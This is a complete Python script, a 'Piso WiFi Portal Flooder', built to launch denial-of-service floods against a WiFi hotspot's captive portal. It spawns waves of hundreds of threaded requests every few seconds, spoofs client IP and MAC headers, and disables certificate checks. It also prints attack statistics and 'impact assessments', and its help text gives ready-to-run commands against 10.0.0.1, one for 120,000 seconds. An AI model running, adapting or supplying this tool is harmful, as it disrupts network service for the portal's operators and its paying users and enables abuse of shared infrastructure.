#!/usr/bin/env python3
"""
Piso WiFi MASSIVE Portal Flooder - Customizable Version
Custom countdown timer and minimum 100 users per wave
"""

import requests
import threading
import time
import random
import sys
import os
from datetime import datetime
import argparse
from queue import Queue
import signal

# ANSI color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class CustomPortalFlooder:
    def __init__(self, portal_url: str):
        """
        Initialize customizable portal flooder
        
        Args:
            portal_url: Full portal URL
        """
        self.portal_url = portal_url
        self.running = True
        self.attack_started = False
        
        # Statistics
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'timeouts': 0,
            'connection_errors': 0,
            'waves_launched': 0,
            'active_threads': 0,
            'peak_threads': 0
        }
        self.lock = threading.Lock()
        
        # Configuration with defaults
        self.wave_interval = 3  # seconds between waves
        self.max_concurrent_threads = 200
        self.min_users_per_wave = 100  # Minimum 100 users
        self.max_users_per_wave = 1000  # Maximum users
        self.total_duration = 120  # Default 2 minutes
        self.countdown_seconds = 10  # Default 10-second countdown
        
        # Wave tracking
        self.next_wave_time = 0
        
        # User agents pool
        self.user_agents = [
            # Windows
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            
            # macOS
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
            
            # iOS
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            
            # Android
            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
            
            # Linux
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
        
        # Results tracking
        self.start_time = None
        self.end_time = None
    
    def print_color(self, color, text):
        """Print colored text"""
        print(f"{color}{text}{Colors.END}")
    
    def show_configuration(self):
        """Display current configuration"""
        self.print_color(Colors.CYAN, "="*80)
        self.print_color(Colors.YELLOW + Colors.BOLD, "         CUSTOM PORTAL FLOOD ATTACK CONFIGURATION")
        self.print_color(Colors.CYAN, "="*80)
        
        config = f"""
{Colors.WHITE}🎯 Target URL: {self.portal_url}
{Colors.CYAN}⏱️  Countdown Timer: {self.countdown_seconds} seconds
{Colors.GREEN}🌊 Wave Interval: {self.wave_interval} seconds
{Colors.MAGENTA}👥 Users per Wave: {self.min_users_per_wave} to {self.max_users_per_wave}
{Colors.BLUE}🧵 Max Concurrent Threads: {self.max_concurrent_threads}
{Colors.YELLOW}⏳ Total Duration: {self.total_duration} seconds ({self.total_duration//60} minutes)
        """
        
        print(config)
        self.print_color(Colors.CYAN, "="*80)
        
        # Estimated impact
        avg_users = (self.min_users_per_wave + self.max_users_per_wave) // 2
        estimated_waves = self.total_duration // self.wave_interval
        estimated_requests = estimated_waves * avg_users
        
        print(f"{Colors.WHITE}\n📊 ESTIMATED IMPACT:")
        print(f"{Colors.CYAN}─" * 40)
        print(f"{Colors.WHITE}   Estimated Waves: {estimated_waves:,}")
        print(f"{Colors.WHITE}   Estimated Total Users: {estimated_requests:,}")
        print(f"{Colors.WHITE}   Estimated Requests/Second: ~{avg_users/self.wave_interval:.1f}")
        self.print_color(Colors.CYAN, "="*80)
    
    def custom_countdown_timer(self, seconds: int):
        """Display custom countdown timer with animation"""
        if seconds <= 0:
            print(f"{Colors.GREEN}{Colors.BOLD}\n🚀 ATTACK STARTING IMMEDIATELY!{Colors.END}")
            self.attack_started = True
            return
        
        self.print_color(Colors.YELLOW + Colors.BOLD, f"\n🎯 CUSTOM COUNTDOWN: {seconds} SECONDS")
        self.print_color(Colors.CYAN, "─" * 60)
        
        for i in range(seconds, 0, -1):
            if not self.running:
                return
            
            # Calculate progress
            progress = (seconds - i) / seconds
            
            # Different display styles based on time remaining
            if seconds > 30:
                # For long countdowns, show every 5 seconds
                if i % 5 != 0 and i != seconds and i != 1:
                    time.sleep(1)
                    continue
            
            # Create visual progress bar
            bar_length = 40
            filled = int(bar_length * progress)
            empty = bar_length - filled
            
            # Color based on time remaining
            if i > seconds * 0.7:
                color = Colors.GREEN
                bar_color = Colors.GREEN
            elif i > seconds * 0.3:
                color = Colors.YELLOW
                bar_color = Colors.YELLOW
            else:
                color = Colors.RED
                bar_color = Colors.RED
            
            # Format time display
            if i > 60:
                minutes = i // 60
                seconds_remaining = i % 60
                time_display = f"{minutes:02d}:{seconds_remaining:02d}"
            else:
                time_display = f"{i:02d}s"
            
            # Create bar
            bar = bar_color + "█" * filled + Colors.WHITE + "░" * empty
            
            # Print countdown
            print(f"\r{color}{Colors.BOLD}⏰ {time_display} remaining {bar} {progress*100:.0f}%", 
                  end="", flush=True)
            
            # Special effects
            if i <= 5:
                # Flashing effect for last 5 seconds
                print(f"{Colors.RED}{Colors.BOLD} 🚨", end="", flush=True)
            
            time.sleep(1)
        
        # Attack start animation
        print(f"\r{Colors.GREEN}{Colors.BOLD}" + " " * 80)
        print(f"\r{Colors.GREEN}{Colors.BOLD}" + "🔥" * 30)
        print(f"{Colors.GREEN}{Colors.BOLD}🔥🔥🔥 ATTACK IN PROGRESS! 🔥🔥🔥")
        print(f"{Colors.GREEN}{Colors.BOLD}" + "🔥" * 30 + Colors.END)
        self.attack_started = True
    
    def generate_headers(self, request_id: int):
        """Generate random headers for each request"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Client-MAC': f"{random.randint(16,99):02x}:{random.randint(16,99):02x}:{random.randint(16,99):02x}:"
                          f"{random.randint(16,99):02x}:{random.randint(16,99):02x}:{random.randint(16,99):02x}",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Request-ID': str(request_id)
        }
    
    def flood_request(self, request_id: int, wave_id: int):
        """Make a single flood request"""
        try:
            headers = self.generate_headers(request_id)
            
            # Small random delay
            time.sleep(random.uniform(0.001, 0.01))
            
            response = requests.get(
                self.portal_url,
                headers=headers,
                timeout=3,
                verify=False,
                allow_redirects=True
            )
            
            with self.lock:
                self.stats['total_requests'] += 1
                
                if 200 <= response.status_code < 400:
                    self.stats['successful'] += 1
                else:
                    self.stats['failed'] += 1
                
            return True
            
        except requests.exceptions.Timeout:
            with self.lock:
                self.stats['total_requests'] += 1
                self.stats['failed'] += 1
                self.stats['timeouts'] += 1
            return False
            
        except requests.exceptions.ConnectionError:
            with self.lock:
                self.stats['total_requests'] += 1
                self.stats['failed'] += 1
                self.stats['connection_errors'] += 1
            return False
            
        except Exception:
            with self.lock:
                self.stats['total_requests'] += 1
                self.stats['failed'] += 1
            return False
        finally:
            with self.lock:
                self.stats['active_threads'] -= 1
    
    def launch_wave(self, wave_id: int):
        """Launch a wave with random user count between min and max"""
        # Random users between min and max
        num_users = random.randint(self.min_users_per_wave, self.max_users_per_wave)
        
        print(f"{Colors.MAGENTA}{Colors.BOLD}\n🌊 [WAVE {wave_id}] LAUNCHING {num_users:,} USERS...{Colors.END}")
        
        wave_start = time.time()
        
        with self.lock:
            self.stats['waves_launched'] += 1
        
        threads = []
        successful_in_wave = 0
        
        # Launch users in batches
        batch_size = min(50, num_users // 10)
        for batch_start in range(0, num_users, batch_size):
            if not self.running:
                break
                
            batch_end = min(batch_start + batch_size, num_users)
            batch_threads = []
            
            for i in range(batch_start, batch_end):
                if not self.running:
                    break
                
                # Check thread limit
                while self.running:
                    with self.lock:
                        if self.stats['active_threads'] < self.max_concurrent_threads:
                            self.stats['active_threads'] += 1
                            if self.stats['active_threads'] > self.stats['peak_threads']:
                                self.stats['peak_threads'] = self.stats['active_threads']
                            break
                    time.sleep(0.001)
                
                if not self.running:
                    break
                
                # Create thread
                request_id = wave_id * 1000000 + i
                thread = threading.Thread(
                    target=self.flood_request,
                    args=(request_id, wave_id)
                )
                thread.daemon = True
                thread.start()
                threads.append(thread)
                batch_threads.append(thread)
                
                # Small delay between thread creation
                if i % 10 == 0:
                    time.sleep(0.001)
            
            # Wait for batch to complete
            for thread in batch_threads:
                if self.running:
                    thread.join(timeout=2)
        
        # Wait for remaining threads
        for thread in threads:
            if self.running:
                thread.join(timeout=1)
        
        wave_duration = time.time() - wave_start
        
        # Wave statistics
        with self.lock:
            wave_stats = {
                'wave_id': wave_id,
                'users_launched': num_users,
                'duration': wave_duration
            }
        
        # Display wave completion
        if wave_duration < 2:
            duration_color = Colors.GREEN
        elif wave_duration < 5:
            duration_color = Colors.YELLOW
        else:
            duration_color = Colors.RED
        
        print(f"{Colors.CYAN}   ✅ Wave {wave_id} completed in {duration_color}{wave_duration:.2f}s{Colors.CYAN}")
        
        return wave_stats
    
    def continuous_wave_attack(self):
        """Continuous wave attack"""
        self.start_time = time.time()
        self.end_time = self.start_time + self.total_duration
        wave_id = 1
        
        self.print_color(Colors.GREEN + Colors.BOLD, "\n🚀 CONTINUOUS WAVE ATTACK STARTED!")
        self.print_color(Colors.YELLOW, f"⏳ Duration: {self.total_duration} seconds | 🌊 Interval: {self.wave_interval}s")
        self.print_color(Colors.CYAN, "─" * 60)
        
        # Set first wave time
        self.next_wave_time = self.start_time
        
        while self.running and time.time() < self.end_time:
            current_time = time.time()
            
            # Check if it's time for next wave
            if current_time >= self.next_wave_time:
                # Launch wave
                self.launch_wave(wave_id)
                
                # Schedule next wave
                self.next_wave_time = current_time + self.wave_interval
                wave_id += 1
            
            # Small sleep
            time.sleep(0.01)
        
        # Complete duration
        remaining_time = self.end_time - time.time()
        if remaining_time > 0:
            self.print_color(Colors.YELLOW, f"\n⏳ Completing duration... {remaining_time:.1f}s remaining")
            time.sleep(remaining_time)
    
    def display_real_time_stats(self):
        """Display real-time statistics"""
        last_update = 0
        update_interval = 0.5
        
        while self.running and (not self.end_time or time.time() < self.end_time):
            current_time = time.time()
            
            if current_time - last_update >= update_interval:
                with self.lock:
                    total = self.stats['total_requests']
                    success = self.stats['successful']
                    failed = self.stats['failed']
                    waves = self.stats['waves_launched']
                    active = self.stats['active_threads']
                    peak = self.stats['peak_threads']
                
                if self.start_time:
                    elapsed = current_time - self.start_time
                    if elapsed > 0:
                        req_per_sec = total / elapsed
                        
                        if self.total_duration:
                            remaining = max(0, self.total_duration - elapsed)
                            progress = min(100, (elapsed / self.total_duration) * 100)
                        else:
                            remaining = 0
                            progress = 100
                        
                        # Calculate rates
                        success_rate = (success / total * 100) if total > 0 else 0
                        
                        # Format URL display
                        url_display = self.portal_url
                        if len(url_display) > 35:
                            url_display = url_display[:32] + "..."
                        
                        # Build status line
                        status = (f"{Colors.WHITE}📡 {url_display:35s} | "
                                 f"{Colors.CYAN}🌊 {waves:3d} | "
                                 f"{Colors.GREEN}✅ {success:6,} | "
                                 f"{Colors.RED}❌ {failed:5,} | "
                                 f"{Colors.YELLOW}📈 {success_rate:5.1f}% | "
                                 f"{Colors.MAGENTA}⚡ {req_per_sec:5.1f}/s | ")
                        
                        if self.total_duration:
                            # Color code remaining time
                            if remaining > 60:
                                remaining_color = Colors.GREEN
                            elif remaining > 30:
                                remaining_color = Colors.YELLOW
                            else:
                                remaining_color = Colors.RED
                            
                            status += f"{remaining_color}⏳ {remaining:4.0f}s ({progress:3.0f}%)"
                        
                        # Clear and print
                        sys.stdout.write("\r" + status + " " * 20)
                        sys.stdout.flush()
                
                last_update = current_time
            
            time.sleep(0.1)
    
    def run_attack(self):
        """Run the complete attack"""
        # Show configuration
        self.show_configuration()
        
        # Show warnings
        print(f"{Colors.RED}{Colors.BOLD}\n" + "⚠️" * 40)
        print(f"{Colors.RED}{Colors.BOLD}   WARNING: HIGH-INTENSITY NETWORK ATTACK")
        print(f"{Colors.RED}{Colors.BOLD}   SERVER MAY BECOME UNRESPONSIVE")
        print(f"{Colors.RED}{Colors.BOLD}   USE RESPONSIBLY!")
        print(f"{Colors.RED}{Colors.BOLD}" + "⚠️" * 40 + Colors.END)
        
        # Get final confirmation
        confirm = input(f"{Colors.YELLOW}{Colors.BOLD}\n❓ PROCEED WITH ATTACK? (YES/no): ").upper()
        
        if confirm != "YES":
            print(f"{Colors.RED}\n❌ Attack cancelled")
            return
        
        # Start countdown
        self.custom_countdown_timer(self.countdown_seconds)
        
        if not self.running:
            return
        
        # Start stats display
        stats_thread = threading.Thread(target=self.display_real_time_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Run attack
        try:
            self.continuous_wave_attack()
        except KeyboardInterrupt:
            print(f"{Colors.YELLOW}\n\n⚠️ Attack stopped by user")
        except Exception as e:
            print(f"{Colors.RED}\n❌ Error: {e}")
        
        # Cleanup
        self.end_time = time.time()
        self.running = False
        time.sleep(1)
        
        # Show final report
        self.show_final_report()
    
    def show_final_report(self):
        """Show final attack report"""
        if not self.start_time:
            return
        
        total_duration = self.end_time - self.start_time
        
        self.print_color(Colors.CYAN, "\n" + "="*80)
        self.print_color(Colors.YELLOW + Colors.BOLD, "                 ATTACK COMPLETE - FINAL REPORT")
        self.print_color(Colors.CYAN, "="*80)
        
        with self.lock:
            total = self.stats['total_requests']
            success = self.stats['successful']
            failed = self.stats['failed']
            timeouts = self.stats['timeouts']
            conn_errors = self.stats['connection_errors']
            waves = self.stats['waves_launched']
            peak_threads = self.stats['peak_threads']
        
        # Calculate statistics
        success_rate = (success / total * 100) if total > 0 else 0
        req_per_sec = total / total_duration if total_duration > 0 else 0
        
        # Configuration summary
        print(f"{Colors.WHITE}\n⚙️  ATTACK CONFIGURATION:")
        print(f"{Colors.CYAN}─" * 40)
        print(f"{Colors.WHITE}   Target: {self.portal_url}")
        print(f"{Colors.WHITE}   Duration: {total_duration:.1f}s ({self.total_duration}s requested)")
        print(f"{Colors.WHITE}   Waves: {waves}")
        print(f"{Colors.WHITE}   Users/Wave: {self.min_users_per_wave}-{self.max_users_per_wave}")
        print(f"{Colors.WHITE}   Wave Interval: {self.wave_interval}s")
        print(f"{Colors.WHITE}   Max Threads: {self.max_concurrent_threads}")
        
        # Results
        print(f"{Colors.WHITE}\n📊 ATTACK RESULTS:")
        print(f"{Colors.CYAN}─" * 40)
        print(f"{Colors.GREEN}   Successful: {success:,} ({success_rate:.1f}%)")
        print(f"{Colors.RED}   Failed: {failed:,}")
        print(f"{Colors.YELLOW}   Total: {total:,}")
        print(f"{Colors.MAGENTA}   Rate: {req_per_sec:.1f} requests/second")
        print(f"{Colors.BLUE}   Peak Threads: {peak_threads}")
        
        # Failure breakdown
        if failed > 0:
            print(f"{Colors.WHITE}\n⚠️  FAILURE BREAKDOWN:")
            print(f"{Colors.CYAN}─" * 30)
            print(f"{Colors.RED}   Timeouts: {timeouts:,} ({(timeouts/failed*100) if failed > 0 else 0:.1f}%)")
            print(f"{Colors.RED}   Connection Errors: {conn_errors:,} ({(conn_errors/failed*100) if failed > 0 else 0:.1f}%)")
            other_failures = failed - timeouts - conn_errors
            print(f"{Colors.RED}   Other: {other_failures:,} ({(other_failures/failed*100) if failed > 0 else 0:.1f}%)")
        
        # Impact assessment
        print(f"{Colors.WHITE}\n💥 IMPACT ASSESSMENT:")
        print(f"{Colors.CYAN}─" * 30)
        
        # Determine intensity
        if req_per_sec > 500:
            intensity = "EXTREME"
            intensity_color = Colors.RED
        elif req_per_sec > 200:
            intensity = "HIGH"
            intensity_color = Colors.YELLOW
        elif req_per_sec > 50:
            intensity = "MODERATE"
            intensity_color = Colors.GREEN
        else:
            intensity = "LOW"
            intensity_color = Colors.CYAN
        
        print(f"{intensity_color}   Intensity: {intensity}")
        print(f"{Colors.YELLOW}   Estimated Bandwidth: {(total * 5000) / (1024*1024):.1f} MB")
        print(f"{Colors.YELLOW}   Estimated Concurrent Users: ~{req_per_sec * 2:.0f}")
        
        # Save results
        self.save_results(total_duration)
        
        self.print_color(Colors.CYAN, "\n" + "="*80)
    
    def save_results(self, duration: float):
        """Save results to file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"custom_flood_{timestamp}.log"
        
        with self.lock:
            total = self.stats['total_requests']
            success = self.stats['successful']
            failed = self.stats['failed']
            timeouts = self.stats['timeouts']
            conn_errors = self.stats['connection_errors']
            waves = self.stats['waves_launched']
            peak_threads = self.stats['peak_threads']
        
        with open(filename, 'w') as f:
            f.write("="*80 + "\n")
            f.write("CUSTOM PORTAL FLOOD ATTACK REPORT\n")
            f.write("="*80 + "\n\n")
            
            f.write(f"Attack Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target URL: {self.portal_url}\n\n")
            
            f.write("CONFIGURATION:\n")
            f.write("-"*40 + "\n")
            f.write(f"Countdown: {self.countdown_seconds}s\n")
            f.write(f"Duration: {self.total_duration}s\n")
            f.write(f"Wave Interval: {self.wave_interval}s\n")
            f.write(f"Users per Wave: {self.min_users_per_wave}-{self.max_users_per_wave}\n")
            f.write(f"Max Threads: {self.max_concurrent_threads}\n\n")
            
            f.write("RESULTS:\n")
            f.write("-"*40 + "\n")
            f.write(f"Actual Duration: {duration:.1f}s\n")
            f.write(f"Waves Launched: {waves}\n")
            f.write(f"Total Requests: {total}\n")
            f.write(f"Successful: {success}\n")
            f.write(f"Failed: {failed}\n")
            f.write(f"Success Rate: {(success/total*100) if total > 0 else 0:.1f}%\n")
            f.write(f"Requests/Second: {total/duration:.2f}\n")
            f.write(f"Peak Threads: {peak_threads}\n\n")
            
            if failed > 0:
                f.write("FAILURE ANALYSIS:\n")
                f.write("-"*40 + "\n")
                f.write(f"Timeouts: {timeouts}\n")
                f.write(f"Connection Errors: {conn_errors}\n")
                f.write(f"Other Failures: {failed - timeouts - conn_errors}\n\n")
            
            f.write("COMMAND TO REPEAT:\n")
            f.write("-"*40 + "\n")
            f.write(f"python3 custom_flood.py --url \"{self.portal_url}\" ")
            f.write(f"--duration {self.total_duration} --threads {self.max_concurrent_threads} ")
            f.write(f"--min {self.min_users_per_wave} --max {self.max_users_per_wave} ")
            f.write(f"--countdown {self.countdown_seconds}\n")
        
        print(f"{Colors.GREEN}\n📄 Report saved to: {filename}")


def signal_handler(sig, frame):
    """Handle Ctrl+C"""
    print(f"{Colors.YELLOW}\n\n⚠️  Stopping attack...")
    sys.exit(0)


def main():
    """Main function"""
    signal.signal(signal.SIGINT, signal_handler)
    
    parser = argparse.ArgumentParser(
        description="Custom Portal Flooder - Adjustable countdown and wave sizes",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Your exact command with custom countdown
  python3 custom_flood.py --url "http://10.0.0.1/client?page=dashboard" --duration 120000 --threads 200
  
  # 30-second countdown, 2-minute attack
  python3 custom_flood.py --url "http://10.0.0.1" --duration 120 --countdown 30 --threads 100
  
  # Minimum 100 users, maximum 500 users
  python3 custom_flood.py --url "http://10.0.0.1" --min 100 --max 500 --duration 300
  
  # Quick test with defaults
  python3 custom_flood.py --url "http://10.0.0.1/client?page=dashboard"

Default Values:
  • Countdown: 10 seconds
  • Duration: 120 seconds
  • Min Users: 100
  • Max Users: 1000
  • Threads: 200
  • Wave Interval: 3 seconds
        """
    )
    
    parser.add_argument("--url", "-u", required=True, help="Portal URL to attack")
    
    # Timing
    parser.add_argument("--countdown", "-c", type=int, default=10, help="Countdown timer in seconds (default: 10)")
    parser.add_argument("--duration", "-d", type=int, default=120, help="Attack duration in seconds (default: 120)")
    parser.add_argument("--interval", "-i", type=int, default=3, help="Seconds between waves (default: 3)")
    
    # User configuration
    parser.add_argument("--min", type=int, default=100, help="Minimum users per wave (default: 100)")
    parser.add_argument("--max", type=int, default=1000, help="Maximum users per wave (default: 1000)")
    parser.add_argument("--threads", "-t", type=int, default=200, help="Max concurrent threads (default: 200)")
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.min < 100:
        print(f"{Colors.RED}Error: Minimum users must be at least 100")
        sys.exit(1)
    
    if args.min > args.max:
        print(f"{Colors.RED}Error: Minimum users cannot be greater than maximum users")
        sys.exit(1)
    
    if args.countdown < 0:
        print(f"{Colors.RED}Error: Countdown cannot be negative")
        sys.exit(1)
    
    if args.duration <= 0:
        print(f"{Colors.RED}Error: Duration must be positive")
        sys.exit(1)
    
    # Create and configure flooder
    flooder = CustomPortalFlooder(args.url)
    flooder.countdown_seconds = args.countdown
    flooder.total_duration = args.duration
    flooder.wave_interval = args.interval
    flooder.min_users_per_wave = args.min
    flooder.max_users_per_wave = args.max
    flooder.max_concurrent_threads = args.threads
    
    # Run attack
    flooder.run_attack()


if __name__ == "__main__":
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()